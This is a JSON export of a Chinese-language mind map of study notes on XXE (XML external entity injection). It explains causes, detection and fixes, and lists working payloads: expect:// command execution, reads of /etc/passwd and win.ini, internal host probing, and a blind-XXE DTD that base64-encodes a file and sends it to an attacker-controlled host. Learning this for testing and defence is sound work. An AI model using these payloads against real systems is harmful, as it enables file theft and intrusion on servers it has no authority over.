{"root":{"data":{"id":"d6pk5ojccv40","created":1735614966937,"text":"XXE XML实体注入"},"children":[{"data":{"id":"d6pk803ir9k0","created":1735615148830,"text":"XXE原理","layout_mind_offset":{"x":-58,"y":-171}},"children":[{"data":{"id":"d6pk894qvfc0","created":1735615168496,"text":"运维人员使用了低版本php,libxml低于2.9.1就会\n造成XXE或者\n程序员设置了libxml_disable_entity_loader(\nFALSE);","layout_right_offset":{"x":15,"y":-37}},"children":[]}]},{"data":{"id":"d6pk82savc00","created":1735615154682,"text":"XML定义","layout_mind_offset":{"x":-74,"y":-182}},"children":[{"data":{"id":"d6pk91oeh400","created":1735615230634,"text":"XML用于标记电子文件使其具有结构性的标记语\n言，可以用来标记数据、定义数据类型，是一种\n允许用户对自己的标记语言进行定义的源语言。\nXIL文档结构包含XIML声明、DTD文档类型定\n义(可选)、文档元素。","layout_right_offset":{"x":16,"y":-40}},"children":[]}]},{"data":{"id":"d6pk82w70880","created":1735615154918,"text":"如何找XXE漏洞","layout_mind_offset":{"x":-65,"y":-218}},"children":[{"data":{"id":"d6pk9i22q6o0","created":1735615266289,"text":"抓包看accept头是否接受xml"},"children":[]},{"data":{"id":"d6pk9i22fv40","created":1735615266289,"text":"抓包修改数据类型，把json改成xml来传输数据"},"children":[]}]},{"data":{"id":"d6pk832576o0","created":1735615155278,"text":"分类","layout_mind_offset":{"x":57,"y":97}},"children":[{"data":{"id":"d6pke1ofmzs0","created":1735615622457,"text":"命令执行","expandState":"expand"},"children":[{"data":{"id":"d6pke467fcg0","created":1735615627885,"text":"<?xml version = \"1.0\"?>\n<!DOCTYPE note [\n<!ENTITY hacker SYSTEM \"expect://id\" >]>","layout_left_offset":{"x":3,"y":-15}},"children":[]}]},{"data":{"id":"d6pke1ofilc0","created":1735615622457,"text":"任意文件读取"},"children":[{"data":{"id":"d6pke5bdg280","created":1735615630374,"text":"<?xml version =\"1.0\"?>\n<!DOCTYPE note [\n<!ENTITY hacker SYSTEM \"file:///etc/\npasswd\" >]>","expandState":"expand","layout_left_offset":{"x":-5,"y":-17}},"children":[]}]},{"data":{"id":"d6pke1ofzuw0","created":1735615622457,"text":"内网存活主机探测"},"children":[{"data":{"id":"d6pke622x540","created":1735615631989,"text":"<?xml version =\"1.0\"?>\n<!DOCTYPE note [\n<!ENTITY hacker SYSTEM \"http:127.0.0.1:\n80\" >]>","layout_left_offset":{"x":21,"y":-19}},"children":[]}]}]},{"data":{"id":"d6pk83gzugw0","created":1735615156176,"text":"漏洞修复","layout_mind_offset":{"x":42,"y":81}},"children":[{"data":{"id":"d6pkf4v65fs0","created":1735615707759,"text":"升级PHP版本"},"children":[]},{"data":{"id":"d6pkf5gyn2w0","created":1735615709076,"text":"2 禁止使用外部实体 libxml disable entity\nloader(TRUE);"},"children":[]},{"data":{"id":"d6pkf5xk9f40","created":1735615710080,"text":"3 过滤用户提交的XML数据，防止出现非法内容\n(<!DOCTYPE、<!ENTITY、SYSTEM、PUBLIC)","layout_left_offset":{"x":-7,"y":1}},"children":[]}]},{"data":{"id":"d6pk85c63j40","created":1735615160237,"text":"XXE攻击","layout_mind_offset":{"x":1270,"y":-139}},"children":[{"data":{"id":"d6pk9zptt280","created":1735615304731,"text":"有回显"},"children":[{"data":{"id":"d6pka87ydvc0","created":1735615323241,"text":"<?xml version =\"1.0\"?><!DOCTYPE\nnotel<!ENTITY hacker SYSTEM \"file:///c:/\nwindows/win.ini\">]><name>&hacker;</\nname>","layout_right_offset":{"x":-1,"y":-29}},"children":[{"data":{"id":"d6pkaadpsco0","created":1735615327943,"text":"有回显直接干就完了","layout_right_offset":{"x":23,"y":0}},"children":[]},{"data":{"id":"d6pkb4jjk6w0","created":1735615393599,"text":"命令的含义:读取对方服务器c:/windows/win.ini\n文件","layout_right_offset":{"x":21,"y":2}},"children":[]}]}]},{"data":{"id":"d6pka0fdan40","created":1735615306275,"text":"无回显"},"children":[{"data":{"id":"d6pkbk0vuw80","created":1735615427299,"text":"建立*.dtd"},"children":[{"data":{"id":"d6pkc13mz8w0","created":1735615464471,"text":"<!ENTITY % file SYSTEM \"php://filter/read=\nconvert.base64-encode/resource=file:///c:/1.\ntxt\">\n<!ENTITY % int \"<!ENTITY &#37; send\nSYSTEM 'http://192.168.0.105:8080?p=%\nfile;'>\">","layout_right_offset":{"x":1,"y":-33}},"children":[{"data":{"id":"d6pkc5wn1yw0","created":1735615474932,"text":"对方网站做了屏蔽的话,要创建的dtd文件将要获\n取的数据内容通过base64加密后发送到攻击者指\n定的服务器上,也会显示在日志里,可以用BP对\nbase64加密的内容进行解密","layout_right_offset":{"x":10,"y":-7}},"children":[]}]}]},{"data":{"id":"d6pkbl3cr540","created":1735615429625,"text":"XML调用","layout_right_offset":{"x":4,"y":6}},"children":[{"data":{"id":"d6pkcm74sy00","created":1735615510395,"text":"<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM \"http://ip/test.\ndtd\">\n%remote;%int;%send;\n]>","layout_right_offset":{"x":18,"y":-33}},"children":[{"data":{"id":"d6pkd4ns2o00","created":1735615550583,"text":"调用的命令"},"children":[]}]}]}]}]}]},"template":"default","theme":"fresh-blue","version":"1.4.43"}